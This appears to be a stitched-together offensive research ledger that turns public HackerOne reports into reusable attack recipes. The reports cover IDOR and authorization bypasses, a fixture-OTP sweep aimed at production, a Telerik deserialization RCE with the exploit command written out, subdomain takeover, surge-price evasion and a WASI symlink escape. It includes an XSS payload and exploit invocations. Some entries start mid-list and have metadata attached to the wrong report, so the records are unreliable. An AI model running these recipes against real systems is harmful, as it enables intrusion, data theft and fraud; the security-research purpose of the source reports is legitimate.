DEDUPE/DELTA: 0 hits across all three write targets for `3020021`, `pontoon`, `unapprove`, `adilnbabras`, `translation.approved`, `get-history`. Related-but-distinct REVIEWED and NOT re-recorded: §17.486 (ACL clause ORDER — a feature-flag short-circuit placed BEFORE the role check; mechanism is ordering, not a state disjunct), §17.42 / #418767 (guard attached to ONE route while a sibling route re-implements the write; here the SAME route carries a logically satisfied guard), the "UI hides the button, the request still works" render-only-suppression family (§17.x display-suppression entries; here a server-side guard EXISTS but is satisfied by object state), the type-coverage guard bypass (~4606; type confusion, not boolean logic). NEW: state-conditioned guard bypass — the authz boolean ORs in `obj.state` and passes for exactly the in-state objects -> §17.505. FRESHNESS: 2025-03/2026-04 — INSIDE the preferred window (disclosed 2026-04-10).

SOURCE: https://hackerone.com/reports/2354888  2026-11-11
ROUTE: reporter body is redacted server-side (`visibility: no-content`, `vulnerability_information` 0 B on the live `.json`); the readable content is the MARS TEAM SUMMARY rendered by `web_extract` of the live page (quoted verbatim below — it is the entire public body). Metadata: Mars (security), "unsubscribe anyone from all ████████ emails @ █████", reporter `abfe`, created 2024-02-04, disclosed 2024-11-25, weakness Improper Access Control - Generic, severity LOW (Team), asset `*.banfield.com`, state Closed/Resolved.
STATUS: UNVERIFIED (not reproduced — the reporter's request shape is not public; the method below is the team summary's own words plus the title; nothing invented)
CLASS: broken access control / IDOR — a one-click email UNSUBSCRIBE URL keyed on a PREDICTABLE subscriber identifier (`sid`) with no per-user secret, so anyone can change ANY user's email-subscription state (CWE-284).
CORE METHOD (the team summary, verbatim): "A vulnerability is reported in the unsubscribe functionality of ████████. The issue allows for the unsubscription of arbitrary users from all Banfield emails by manipulating the subscriber ID (sid) parameter in the unsubscribe URL. This vulnerability is classified under CWE-284: Improper Access Control. The predictable nature of the sid parameter enables potential mass unsubscription of customers from email communications." The test shape it implies:
  1. Extract the unsubscribe URL from any marketing/transactional mail and identify the recipient-identifying parameter (`sid` here; siblings: `uid`, `e`, `p`, `sub`, base64 `email`).
  2. Swap/iterate that parameter across values (predictable/sequential/enumerable) with NO cookie and NO per-user HMAC/token.
  3. Each accepted request is a cross-user WRITE on that user's subscription state ("unsubscribe ... from ALL ... emails"); repeatable at scale -> mass unsubscription.
DETECTION SIGNAL: one-click email actions (unsubscribe, opt-out, email-preference center, List-Unsubscribe POST) whose URL carries only a PREDICTABLE recipient id and no per-user secret; the tell: changing the id (a) succeeds unauthenticated and (b) affects a DIFFERENT user's preferences.
CHAIN: attacker who can enumerate/guess `sid` (or who holds ANY account) -> silently unsubscribe the victim from all program emails -> the victim's mail-based alarms (login/security/reset notifications, where the same system sends them) never arrive -> detection suppression for a parallel ATO/fraud action. [Honest limit: the report demonstrates the cross-user unsubscribe only (team-rated LOW; standalone impact = communication-state manipulation at scale); the alert-suppression rung is the chain USE of the primitive, not demonstrated in the report.]
TRANSFERABLE TEST: from any mail the target sends you, take the unsubscribe/opt-out link, replace the recipient parameter with another value (a second test account's id, or `id-1`/`id+1`), request it with NO cookies, then check the OTHER account's subscription state (and whether any notification fired). One-click email actions are state-changing endpoints that skip login — test them for IDOR like any other write. Rule: **the unsubscribe link is an unauthenticated write keyed on an identifier — if the identifier is guessable, everyone's mailbox settings belong to everyone.**

  2. Inject into a LOW-INTEREST nested-array field — `goal[1][Costs]` = `1<ScRiPt>alert(9639)</ScRiPt>` (payload, verbatim) — while the sibling fields hold benign values (`goal[0][Costs]` = `1`, `employeeName`, `payGrade`, `year=2024`, `annMidterm` etc.).

TRANSFERABLE TEST: for every form that GENERATES a document consumed by another user, enumerate the FULL parameter surface INCLUDING nested indexed fields (`name[0][x]`, `name[1][x]` — Burp Param Miner "nested columns"/Intruder on `field[N][sub]`) and inject `<img/src/onerror=alert(1)>` and `<ScRiPt>alert(1)</ScRiPt>` into EACH; then open the generated artifact AS THE SECOND USER and check for execution. Rule: **a generator's indexed array fields are the blind spot of both name-based fuzzing and flat-param filters — and the generated report is a stored-XSS sink whose victim is the REVIEWER, not the submitter.**

STATUS: UNVERIFIED (not reproduced — no Nextcloud instance touched this pass; request shape quoted from the report)
CLASS: broken access control / IDOR — a cross-user DESTRUCTIVE write through an UPDATE route keyed on a GLOBAL AUTO-INCREMENT id (CWE-639): the object id in the request is not ownership-checked, and the update REMOVES the victim's object.
CORE METHOD (the reporter's own steps):
  1. As a standard user, create an external storage mount (Files external), then update its configuration and capture the request, verbatim: `PUT /apps/files_external/userstorages/<storage_id> HTTP/1.1` with JSON body `{"mountPoint":"simpleuser","backend":"owncloud","authMechanism":"password::logincredentials","backendOptions":{"host":"<collab>","root":"","secure":true},"testOnly":true,"id":<storage_id>,"mountOptions":{"enable_sharing":true,...}}` — the object id appears BOTH in the URL and as `"id":<storage_id>` in the body.
  2. The id space is a GLOBAL auto-increment counter: each new storage created by ANYONE increments it (report: "it could become 28") — your own creation sequence tells you where the victims' ids sit.
  3. Log in as the victim (admin or any other role) and create a storage — this advances the counter to a known value (e.g. 28).
  4. As the standard user, replay the SAME update with the id pointed at the victim's storage. Result, verbatim: "this action leads to the removal of the storage from the administrator's account." No privilege required; the effect is destructive (data loss) — the report notes it "didn't grant access to the data".
DETECTION SIGNAL: a config/resource write (PUT/PATCH) whose object id is a client-supplied auto-increment integer present in BOTH the route and the body; a global counter where one tenant's creation moves the id visible to another tenant; the tell: a request with a FOREIGN id returns success and the victim's object disappears instead of 403.
CHAIN: any standard user → create own storage to read the global counter (ids predictable) → `PUT /apps/files_external/userstorages/<victim_id>` with `"id":<victim_id>` → the victim's external storage mount is REMOVED → walking the id space = mass deletion of external storage across every account = data loss + service disruption (team-rated High; integrity+availability on shared infra).
TRANSFERABLE TEST: the foreign-id destructive replay: (1) create your own object on any tenant-configurable resource (storage mount, webhook, integration, key, folder) and note YOUR auto-increment id; (2) replay your own create/update request with the id set to `yours±1` (or an id you can observe); (3) if the victim's object is DELETED or OVERWRITTEN instead of 403/404 you have a cross-tenant destructive write — walk the counter for scale. Also swap the id in BOTH places when it appears in route and body. Rule: **a client-supplied auto-increment id on a write route is a cross-tenant remote control — and when the verb is UPDATE but the effect is DELETE, ownership is checked nowhere.**
DEDUPE/DELTA: 0 hits across all three write targets for `2212627`, `files_external`, `userstorages`, `Delete external storage`. Metadata: Lark Technologies, "Non privileged user is able to approve his own app himself leading to mass privilege escalations.", reporter `imran_nisar`, created 2021-04-19, disclosed 2021-11-20, weakness Privilege Escalation, severity high (7.1), state Closed/Resolved, asset larksuite.com. The request/response shapes are NOT public (redacted).
STATUS: UNVERIFIED (not reproduced — body redacted; the method below is the title + team summary's own words, nothing invented)
CLASS: privilege escalation / broken access control on a TENANT APP-APPROVAL WORKFLOW — the app-approval action does not verify that the caller is an admin (or that the caller is not the app's own submitter), so a non-privileged tenant member approves their own app and the approved app's permissions propagate tenant-wide (CWE-863 / CWE-269).
CORE METHOD (what the public record establishes):
  1. Entry point: the app-approval action in a Lark tenant (the workflow that takes a submitted app from PENDING to APPROVED; the admin-approval gate is the control).
  2. The bypass, verbatim from the team summary: an attacker can "approve the apps in the same tenant by bypassing the admin approval" — the approval action authorises the CALLER's role nowhere (or trusts the app's own submitter), so a non-privileged member calls it on their OWN pending app.
  3. Effect, verbatim from the title: "Non privileged user is able to approve his own app himself leading to mass privilege escalations" — a self-approved app is treated as a trusted/approved tenant app, and its granted permissions (tenant-wide API scopes, data access) apply at the tenant level.
DETECTION SIGNAL: any tenant/organization app-store or integration-approval workflow (apps, bots, connectors, OAuth clients, plugins) with a PENDING→APPROVED state; the tell: a non-admin tenant member can drive their own submission to APPROVED (the UI hides the approve button, but the action endpoint answers 200), or the approval action's authorisation checks only the app's state and not the caller's role.
CHAIN: non-privileged tenant member → submit an app (or use an existing pending app) → call the app-approval action on it (bypassing the admin-approval gate) → the app becomes APPROVED/trusted tenant-wide → the app's scopes/permissions are granted at the TENANT level → mass privilege escalation (every tenant member's data reachable through the self-approved app; the team's own title says "mass privilege escalations"). [Honest limit: the endpoint, the parameter and the request shape are redacted; the team summary states the mechanism and the impact.]
TRANSFERABLE TEST: on any tenant app/integration approval workflow — (1) as the LOWEST-privilege tenant member, submit an app/integration and leave it PENDING; (2) capture the admin's approval request (or infer the action: `POST /<tenant>/apps/<id>/approve`, a GraphQL `approveApp`/`updateApp` mutation, a `status=APPROVED` PATCH); (3) replay it with YOUR cookie on YOUR OWN pending app; (4) a 200 / the app leaves PENDING = the approval action does not check the caller's role — then check what tenant-wide scopes the approved app now holds. Rule: **an approval action that authorises the OBJECT's state but not the CALLER's role is a self-approval primitive — and when the object is an APP, self-approval is tenant-wide privilege escalation.**

ROUTE: full reporter body (1,850 B, `visibility: full`) read live this pass on the `.json` route (HTTP 200). Metadata: Mattermost (security), "Privilege Escalation leading to post in channel without having privilege", reporter `fuzzsqlb0f`, created 2021-03-02, disclosed 2021-09-13, weakness Privilege Escalation, severity low (2.6), state Closed/Resolved.
STATUS: UNVERIFIED (not reproduced — no Mattermost instance touched this pass; steps quoted from the report)
CLASS: broken access control / stale-authorization on a WRITE — a channel's "members can post" permission is REVOKED, the UI enforces the read-only state, but the post endpoint still accepts a request captured while the permission was GRANTED; the endpoint does not re-evaluate the channel's post-permission against the caller's current rights (CWE-863 / CWE-284).
CORE METHOD (the reporter's own steps):
  1. user1 creates a PUBLIC channel; System Console → Channel → Permission grants guests/members the right to post.
  2. user2 joins the channel and posts a comment while the permission is GRANTED; capture that POST (the channel-id + message body).
  3. user1 revokes the post permission (System Console → Channel → Permission → guests/members cannot post).
  4. user2's UI now shows "This channel is read only. Only members with permission can post here" — the UI enforces the revocation.
  5. user2 REPLAYS the captured POST from step 2 → the comment lands in user1's channel. Verbatim result: "user2 posted comment in user1 channel `mikefourchannel` even user2 dosen't have privilege to do so."
  6. (The report's step 6 captures a POST to user2's OWN channel as a control/comparison of the request shape.)
DETECTION SIGNAL: a write endpoint (post/comment/reply/edit) whose permission is a CHANNEL/BOARD/THREAD-level toggle ("read only", "locked", "restricted", "members can post: off"); the UI shows the read-only/blocked state but the write API answers 200 to a replayed request; the tell: a request captured while the permission was GRANTED still succeeds AFTER the permission is revoked.
CHAIN: any channel member → capture a post/comment POST while the post permission is granted (primitive: a valid write request) → the channel owner/admin REVOKES the post permission (primitive: a state change that should invalidate the write) → the UI blocks further posting (primitive: the enforcement is UI-only) → replay the captured POST → the comment is accepted → the member posts in a read-only channel = privilege escalation / BAC (team-rated Low 2.6; the impact is a write the role forbids — escalate by targeting a channel where posting is admin-only, or by chaining the same replay pattern across every permission-gated write on the surface). [Honest limit: the report does not distinguish "the endpoint never checks the permission" from "the endpoint caches the ACL"; the replay test is the same either way.]
TRANSFERABLE TEST: the revocation-replay: (1) on any permission-gated write (channel/board/thread comment, ticket reply, document edit, form submission), capture the write request while your role HAS the permission; (2) have the permission REVOKED (or remove yourself from the granted role / lower your own role); (3) replay the captured request verbatim; (4) a 200 / the write appears = the endpoint does not re-evaluate the ACL after the state change. Also test the inverse: capture the request, then have the permission GRANTED, and replay from a context that never had it. Rule: **a permission state change is only real if the WRITE endpoint re-reads it — capture the write while you may, revoke the right, replay, and if it lands, the ACL is enforced in the UI and nowhere else.**
DEDUPE/DELTA: 0 hits across all three write targets for `1114617`, `mikefourchannel`, `privilegeescalation`, `read only`. Related-but-distinct REVIEWED and NOT re-recorded: §17.209 (Showmax #1077520 — a re-auth/confirmation step enforced in the UI, replayed from a context that never re-authenticated; a CONFIRMATION gate, not a permission state change), #386997 (a private program's policy/updates stay READABLE after membership revocation — the READ path, not a write), §17.467 (GitHub #2357443 — a permission MUTATION raced against a state TRANSITION; a TOCTOU race, not a straight replay), §17.424 (Dialogflow — a role downgrade applied additively; a merge bug, not a missing re-check), §17.384 (a scoped token's authz falls back when its scope object is revoked; a token-scope fallback, not a channel permission), §17.505 (a guard boolean that ORs in the object's own state). STATUS: UNVERIFIED (not reproduced — no Starbucks asset was touched this pass; the host, endpoint, OTP constant and effect are quoted verbatim from the team summary)
CLASS: authorization/IDOR cross-user data read whose only gate is an OTP check that accepts a STATIC TEST-FIXTURE value (111111) — a seeded test credential left in a non-prod mirror of a customer API (CWE-639; the fixture is test-credential material, CWE-798-flavored).
CORE METHOD (what the public record establishes):
  1. THE SURFACE: the non-prod mirror of the reservation product, `https://reservation.stg.starbucks.com.cn` — the team summary's own words: "the staging/non production site"; in program scope as "Other assets".
  2. THE ENDPOINT: `/api/customer/reservation/history` — a per-customer reservation-history API gated by an OTP check.
  3. THE BYPASS, verbatim: the site "allowed anyone to retrieve fabricated test user reservation data by providing a OTP of 111111" — the OTP verifier accepts the CONSTANT `111111` (a seeded test fixture) instead of a code issued to the customer's phone; no interception, no brute force, no rate-limit problem.
  4. THE EFFECT: with the fixture OTP accepted, the API returns the target user's reservation history — a cross-user read. [Honest limit: the body is redacted — the parameter names, the HTTP verb and the customer identifier are NOT public; only the host, the path, the OTP constant and the effect are. Nothing else is invented.]
DETECTION SIGNAL: an OTP-gated read flow (verify-then-read) on a `stg.`/`nonprod`/`uat` mirror of a prod API surface; the tell: a CONSTANT OTP works for different customer identifiers and works repeatedly, and no SMS/e-mail was ever triggered — the gate is a fixture comparison, not a code check.
CHAIN: attacker reaches the non-prod mirror of a customer API (primitive: staging host in scope) -> the OTP gate accepts the fixture `111111` (primitive: seeded test credential survives into the environment) -> request a user's reservation history and receive it (escalation: cross-user read of reservation records) -> [escalation NOT demonstrated in the report] if the same fixture-OTP code path exists on the PROD endpoint or staging shares the production DB, the "fabricated test user" rows become real customer reservations/PII = cross-tenant data exposure (P2). Honest limit: the team summary explicitly says "fabricated test user reservation data" — the demonstrated read is TEST data, which is why the team rated it medium 6.1 and paid no bounty.
TRANSFERABLE TEST: the fixture-OTP sweep on every OTP-gated endpoint: capture the verify/read request and submit it with the OTP field set to `111111`, then `000000`, `123456`, `888888`, `666666`, `012345`, `112233`, `999999` WITHOUT triggering an actual code send, varying the customer/object identifier each time; a 200 with data = the verifier accepts a seeded test value. Run it first on any non-prod mirror in scope, then REPLAY the identical request against the prod endpoint — the prod result is the reportable impact. Rule: **an OTP gate that accepts a constant is not authentication, it is a test fixture — and a fixture's severity is measured by replaying it against prod.**

ROUTE: full reporter body (2,273 B, `visibility: full`) read live this pass on the `.json` route (HTTP 200). Metadata: U.S. Dept Of Defense, "Remote Code Execution via Insecure Deserialization in Telerik UI", weakness Deserialization of Untrusted Data, severity Critical (team), state Closed/Resolved, reporter `sw33tlie`, submitted 2020-04-03, disclosed 2020-05-07.
STATUS: UNVERIFIED (not reproduced — no Telerik install was exploited this pass; every command and quote below is verbatim from the report body; the report's own credited public material is the Bishop Fox CVE-2019-18935 research and the `noperator/CVE-2019-18935` exploit, both named in the body)
CLASS: insecure deserialization -> RCE, chained as the SECOND stage of a legacy third-party upload-handler chain (Telerik Web UI for ASP.NET AJAX RadAsyncUpload: arbitrary-file-upload CVE + deserialization CVE).
CORE METHOD (the reporter's own steps):
  1. FINGERPRINT: the Telerik async-upload handler answers, verbatim: `https://███/Telerik.Web.UI.WebResource.axd?type=rau` on an outdated Telerik Web UI (the report's instance: v2016.2.607.40). Version gate from the report's own fix line: anything before "R3 2019 SP1 (v2019.3.1023)" is vulnerable.
  2. THE CHAIN is two CVEs, verbatim: "we can achieve full RCE by chaining two different CVEs: CVE-2017-11317, which allows us to upload arbitrary files on the server, and CVE-2019-18935, which is a deserialization vulnerability."
  3. TOOLING: the credited writeup `https://know.bishopfox.com/research/cve-2019-18935-remote-code-execution-in-telerik-ui` plus the public exploit `https://github.com/noperator/CVE-2019-18935` (`pip3 install pycryptodome`); run, verbatim: `python3 CVE-2019-18935.py -u https://█████/Telerik.Web.UI.WebResource.axd?type=rau -v 2016.2.607.40 -f 'C:\Windows\Temp' -p sleep_042020163752,45_amd64.dll`.
  4. THE OPERATIONAL DELTA (the reporter's own patch to the public exploit, verbatim): "I noticed that when uploading the .dll file the server added a .tmp at the end of the file name. That's why the original code was failing to exploit the deserialization part. I added `+ '.tmp'` at the end of line 95 and after that it worked just fine." — the deserialization stage must reference the file UNDER THE SERVER'S STORED NAME (extension mangling), not the name the attacker uploaded.
  5. THE PROOF ORACLE: a DLL whose only action is Sleep(10) — "This will make the server hang for roughly ten seconds, and after that you will get a response like this one: `[*] Response time: 12.88 seconds`". One-shot constraint, verbatim: "A DLL file can only work once. This means that to test the vulnerability again a new DLL has to be compiled." (the reporter shipped several prebuilt DLLs for exactly this reason; he deliberately did NOT upload a reverse shell).
  6. FIX, verbatim: "Just upgrade Telerik for ASP.NET AJAX to R3 2019 SP1 (v2019.3.1023) or later."
DETECTION SIGNAL: any ASP.NET target answering on `Telerik.Web.UI.WebResource.axd` — especially `?type=rau` (RadAsyncUpload) — or on `Telerik.Web.UI.DialogHandler.aspx`; a Telerik.Web.UI version below 2019.3.1023 in web.config / handler output / dialog page. TELL: the RAU handler responds instead of 404/403.
CHAIN: unauthenticated attacker -> probe `Telerik.Web.UI.WebResource.axd?type=rau` (primitive: legacy third-party handler exposed on the public site) -> CVE-2017-11317 arbitrary file upload (escalation: attacker DLL written to a server-side path such as `C:\Windows\Temp`) -> CVE-2019-18935 deserialization referencing the uploaded file by its STORED name (`.tmp`-mangled) (escalation: the deserializer loads and invokes the attacker DLL) -> full RCE on the server (impact, verbatim: "Full **Remote Code Execution** on the vulnerable server"; DoD team rated Critical).
TRANSFERABLE TEST: on every ASP.NET host in scope, GET `/Telerik.Web.UI.WebResource.axd?type=rau` and `/Telerik.Web.UI.DialogHandler.aspx`; if the handler exists and the version predates 2019.3.1023, run the `noperator/CVE-2019-18935` exploit with (a) the filename reference patched to the server's stored name (`+ '.tmp'`, or whatever the upload response reports), (b) `-f` pointed at a writable temp dir, (c) a SLEEP-only DLL as the RCE oracle — ~10 s response latency is the proof — and recompile/replace the DLL for every attempt. Rule: **an exposed `?type=rau` handler on a pre-R3-2019-SP1 Telerik is a two-CVE RCE chain (upload -> deserialization) — and stage two must address the file AS THE SERVER STORED IT, because the upload path renames it; a sleep DLL is the safe, non-destructive proof.**

SOURCE: https://hackerone.com/reports/365853  2026-11-11
ROUTE: full reporter body (1,714 B, `visibility: full`) read live this pass on the `.json` route (HTTP 200), plus the team summary in the same JSON's `summaries[]`. Metadata: Shopify, "Subdomain Takeover - https://competition.shopify.com/", weakness Privilege Escalation (H1's own label; the finding is a subdomain takeover), severity medium (rating), reporter `llt4l`, created 2018-06-14, disclosed 2018-06-19, state Closed/Resolved. Team summary, verbatim: "@llt4l discovered a dangling CNAME pointed to Heroku which allowed them to claim `competition.shopify.com`. We removed the DNS entry immediately and took the extra time to review and clean up some other records. As a result, we awarded an extra $250 on top of the typical $500 bounty."
STATUS: UNVERIFIED (not reproduced — no Shopify DNS or Heroku app was touched this pass; the evidence is the reporter's own live PoC page plus the team's confirmation and bounty)
CLASS: subdomain takeover / server-side DNS misconfiguration with impact — a first-party hostname CNAMEs to Heroku's PER-HOSTNAME edge (`<host>.herokudns.com`) while the custom domain is claimed by NO app, so the attacker claims it on their own Heroku app and the first-party hostname serves attacker content with platform-issued TLS (CWE-350).
CORE METHOD (the reporter's own steps):
  1. THE RECORD, verbatim: "The Shopify.com subdomain competition.shopify.com was vulnerable to a subdomain takeover as it was pointing to an unclaimed Heroku service through the CNAME competition.shopify.com.herokudns.com, while the custom domain 'competition.shopify.com' was unclaimed in Heroku." — the CNAME target is `X.herokudns.com` where X is exactly the claimed hostname, and Heroku's edge routes X to whichever app holds that custom domain.
  2. THE CLAIM, verbatim: "I have claimed the domain in Heroku and uploaded a proof of concept, which you can view here: https://competition.shopify.com/329a01fddb5a552265170b02c579c85f.html" — the attacker adds the dangling hostname as a CUSTOM DOMAIN on their OWN Heroku app (`heroku domains:add competition.shopify.com`); because the DNS already points at the platform's per-hostname edge, the edge immediately routes the first-party hostname to the attacker's app.
  3. THE PROOF ORACLE: a random-path PoC page served at the claimed hostname (the reporter kept the index benign — "I've also redirected visitors of the index page to https://shopify.com" — so only the random path proves the takeover).
  4. THE FIX, verbatim: "delete the entry from your DNS servers" (or re-bind the custom domain to a legitimate Heroku app).
DETECTION SIGNAL: `dig <host> +short` / `dnsx -cname` returning a CNAME whose target is `<host>.herokudns.com` — the target EMBEDS the claimed hostname (the precise tell, distinct from app-name edges like `*.herokuapp.com`); the HTTP response is the provider's "no such app / no such domain" page; the decisive check: adding the hostname as a custom domain to a throwaway app on the PaaS succeeds instead of answering "already claimed".
CHAIN: a first-party hostname with a dangling CNAME to `X.herokudns.com` and no app holding custom domain X (primitive) -> attacker adds X to their own Heroku app (escalation: the first-party hostname now routes to attacker content) -> the platform issues TLS for the first-party name, so the origin is fully trusted (escalation: "SSL has also been enabled, giving end users more trust of the site") -> arbitrary JS on a trusted origin (cookie-scope / SameSite sibling blast radius, Bugbountyskills.md:4091), fool-proof phishing harvesting "Shopify customer/employee credentials" and "customer credit card details", OAuth/allowlist trust abuse, malware/C2 hosting (the report's own impact list). Per doctrine §8: preconditions = the dangling record exists and no other app holds the domain; gain = arbitrary content + valid TLS on a brand hostname. Team rated medium, bounty + $250 bonus.
TRANSFERABLE TEST: for every in-scope hostname, run `dig <host> +short` / `dnsx -cname`; if the target is `<host>.herokudns.com` (or any PaaS per-hostname edge), add the hostname as a custom domain to a throwaway app on that platform and fetch a random path — your content served there is the takeover PoC (record the dig line, the claim result and the served path; claim only what you are authorised to claim). Then measure blast radius: parent-domain cookie scope (`.`-scoped cookies), CT-issued certs, OAuth redirect_uri allowlists. Rule: **a CNAME to `X.herokudns.com` is takeable whenever no app claims X — the PaaS edge routes by hostname, so the claim is just `domains:add` on your own app; the tell is a CNAME target that embeds the claimed hostname plus the provider's "no such app" page.**
DEDUPE/DELTA: 0 hits across all three write targets for `365853`, `competition.shopify`, `llt4l`, `herokudns`, `domains:add`. Recorded subdomain-takeover material REVIEWED and NOT re-recorded: §1.6 (dangling CNAME -> inherit a VENDOR app's stored XSS), #154425 (dangling CNAME to a dead Fastly SERVICE -> claim the service), §17.310 (a static host serving an UNVERIFIED custom domain during a grace window), #1342422 (NS delegation -> claim the cloud DNS ZONE), §17.320 (a CNAME target claimable in the weaker of two product features), #1406335 (dangling CNAME -> re-create a deleted S3 bucket by name+region), §17.377 (CNAME under an UNREGISTERED parent domain -> register the domain; its tell explicitly excludes cloud-service claim endpoints like `*.herokuapp.com`), the myshopify.com verification-state-machine entry (~ledger 10339) and the SameSite blast-radius note (Bugbountyskills.md:4091). None records the PaaS CUSTOM-DOMAIN claim mechanic: the record points at the platform's per-HOSTNAME edge (`X.herokudns.com` embeds the hostname), the binding lives app-side, and the claim is adding the custom domain to the attacker's own app. NEW as a platform claim-mechanic delta (the ledger's established unit of novelty — the Fastly claim and the S3 re-creation were likewise appended as deltas) — no §17 slot (the dangling-CNAME class is owned by the entries above). FRESHNESS: 2018-06 — outside the preferred 6-12 month window (read because assigned).

SOURCE: https://hackerone.com/reports/125250  2026-11-11
ROUTE: full reporter body (1,511 B, `visibility: full`) read live this pass on the `.json` route (HTTP 200); both `summaries[]` fields are empty. Metadata: Uber, "Avoiding Surge Pricing", weakness Violation of Secure Design Principles, team severity NOT RATED (`severity_rating` null), reporter `nikhil_patil`, created 2016-03-23, disclosed 2016-08-11, state Closed. The report links a Drive video, but the steps and prices are fully transcribed in the text — every number below is the reporter's.
STATUS: UNVERIFIED (not reproduced — no Uber app was exercised this pass; steps and prices quoted from the report)
CLASS: business logic with monetary impact — QUOTE/FINALIZE CONTEXT SPLIT: the fare is quoted when the pickup is chosen on the MAP step, and the CONFIRMATION step accepts a MUTATED pickup without re-pricing, so the surge-free quote binds to a surge pickup and the pre-decided booking charges it (CWE-840).
CORE METHOD (the reporter's own steps and numbers):
  1. QUOTE the expensive context first as the control: Uber Go, pickup "Prestige Shantiniketan", destination "Big Brewsky" in a 1.3x surge area -> "Share your car" fare 249.91 / "Get your own car" 277.68.
  2. Go BACK to the map screen, scroll into "the area which has no surge", and tap "set pickup location" — the app computes a fresh quote for the NO-SURGE pickup.
  3. On the CONFIRMATION screen, change the pickup back to "Prestige Shantiniketan (the location with surge)" keeping the same destination — without re-crossing the quote step. Result, verbatim: "Ta-Da !! Now you can see the price without surge even though there is surge in that area (you can see surge symbol on 'Request Pool' button). The 'Share your car' fare is 191.48 and 'Get your own car' fare is 212.76." (vs 249.91 / 277.68 freshly quoted).
  4. BOOK: "Since the UberPool fare is pre-decided, if one has booked using this bug will end up paying the non-surge price for UberPool" — and the reporter confirms it live: "I've personally tried this loophole once for 'Share your car' in the UberGo screen and it worked for me." The same trick makes the FARE ESTIMATE show the non-surge price in surge areas ("Although in the fare estimate, it shows the non-surge price in surge areas using the above trick").
DETECTION SIGNAL: any multi-step booking/checkout/quote flow where (a) the price is computed at an EARLIER step than the one where the final inputs are chosen, (b) the confirmation screen's price no longer matches the currently-selected inputs — here the tell is visible: the surge symbol is on the button while the displayed price is the non-surge one — and (c) the fare/total is pre-decided/locked at booking. The tell: changing a price-determining input at the confirm step does not move the total.
CHAIN: rider in a surge area (primitive: ordinary user) -> obtain a quote for a NO-SURGE pickup (primitive: the quote step prices against the selected pickup) -> change the pickup to the SURGE location at the confirmation step without re-quoting (escalation: the finalize step binds the stale quote to the mutated input) -> book at the pre-decided non-surge fare (impact: direct monetary loss — 191.48 charged vs 249.91 correct on the reporter's own ride; at scale, systematic surge-premium evasion = the doctrine's "business logic (price...) -> monetary loss at scale" branch). Per doctrine §8: preconditions = an ordinary rider account; gain = paying the non-surge fare during surge (monetary loss to the platform / driver pool).
TRANSFERABLE TEST: the quote/finalize split on ANY multi-step priced flow (rides, delivery, shipping, insurance, tickets, tax jurisdiction): (1) complete the QUOTE step with the CHEAPEST input (no-surge zone / nearest warehouse / standard jurisdiction) and capture the total; (2) at the CONFIRMATION/finalize step MUTATE the price-determining input to the EXPENSIVE variant WITHOUT going back through the quote step; (3) diff the total against a FRESH quote made directly with the expensive input (the reporter's control pair: 249.91/277.68 fresh vs 191.48/212.76 stale); (4) BOOK one unit and verify the CHARGED amount — an estimate that lies is chain material, an under-CHARGE is the finding. Rule: **the price must be recomputed server-side against the FINAL inputs at booking time — if the confirmation screen lets you change a price-determining input and the total does not move, the quote is bound to the old context; prove it on the CHARGE, not on the estimate.**
DEDUPE/DELTA: 0 hits across all three write targets for `125250`, `nikhil_patil`, `surge` (as a pricing bug), `pickup location`, `stale quote`, `fare estimate`, `pre-decided`. Related-but-distinct REVIEWED and NOT re-recorded: ledger ~9986 (a ride-tender endpoint where a CLIENT-SUPPLIED `price` parameter overrides the server fare — direct parameter tampering, not a stale server-side quote), §17.323 / #2861888 (Bykea — an IDOR-able config endpoint returns the hash that authorizes a forged bid; hash possession, not quote staleness), #377398 (Augur — a derived fee/bond driven by an attacker-controlled measurement), the Stripe non-idempotent benefit-claim entry, Reddit §17.89 (mass-assigned workflow state) and the promo-code oracle family. NEW: the QUOTE/FINALIZE CONTEXT SPLIT — the finalize step accepts a mutated quote-determining input while keeping the stale quote — a genuinely new general business-logic method -> §17.508. SOURCE: https://hackerone.com/reports/2084280  2026-11-11
ROUTE: full reporter body (1,191 B, `visibility: full`) read live this pass on the `.json` route (HTTP 200), plus the live page via `web_extract` (timeline + triage discussion). Metadata: Node.js (program confirmed on the live-page timeline), "WASI sandbox escape via symlink", weakness Privilege Escalation, severity Medium (4.8), reporter `jessewilson`, created 2023-07-25, disclosed 2025-05-24, state Closed/Resolved (resolution = DOCUMENTATION fix), no CVE, no bounty.
STATUS: UNVERIFIED (not reproduced — no WASI/WASM guest was compiled or run this pass; every step and quote verbatim from the report body and live-page timeline)
CLASS: sandbox escape (privilege escalation out of a path-confinement sandbox) — a WASI runtime's file sandbox ("preopens") checks the LOOKUP NAME passed to its syscalls but not the RESOLVED target after symlink following, so a symlink created inside an allowed directory escapes the sandbox for arbitrary file READ (and, per the report, WRITE) — CWE-59-flavoured path-confinement bypass.
CORE METHOD (the reporter's own steps):
  1. THE SURFACE, verbatim: "The experimental, off-by-default WASI interface sandboxes local file I/O via 'preopens' paths." — carrier: a Kotlin/WASM program on Okio's WASI filesystem integration (report cites `square/okio/okio-wasifilesystem/src/wasmTest/kotlin/okio/WasiTest.kt`; the timeline also carries a C PoC on `uvwasi_*` calls ending in `uvwasi_fd_read`).
  2. THE CREATE STEP (verbatim pseudocode): `path_symlink(old_path = "/etc/passwd", fd = 3, new_path = "passwords.txt")` — a symlink INSIDE the preopen (fd 3) whose TARGET is an outside absolute path; containment applies to `new_path`, never to the link target.
  3. THE ESCAPE STEP (verbatim): `path_open(fd = 3, dirflags = 0, path = "passwords.txt", oflags = 0, fs_rights_base = right_fd_read, fs_rights_inheriting = 0, fdflags = 0)` then `fd_read(fd = fd, iovs = iovs.address, iovsSize = 1)` — the runtime resolves against the preopen, FOLLOWS the link, returns outside bytes (C PoC: "Log the contents of the file that we should not be able to access").
  4. THE EFFECT, verbatim: "Reading and writing an arbitrary file off the host file system. Escaping WASI's sandbox." (demonstrated proof = READ; write asserted in Impact).
  5. VENDOR POSITION (live-page timeline): Node.js staff `guy-bedford`, verbatim: "nowhere does the Node.js WASI implementation claim to provide a capability security model... uv_wasi should be considered an implementation / abstraction and not a security model" — fix = "update all documentation to remove references to the term 'sandbox'". On Node.js this is a DOCS bug; the identical test against any runtime that DOES claim a capability model is a true sandbox escape.
DETECTION SIGNAL: any host running untrusted WASM/WASI guests (or any jail with path allowlists — SFTP/FTP jails, plugin "userdir" file APIs, container volume sandboxes) exposing a symlink-creation call; the tell: containment enforced on the LOOKUP name, resolved link target never re-checked — probe with a link inside the allowed dir to a canary outside it.
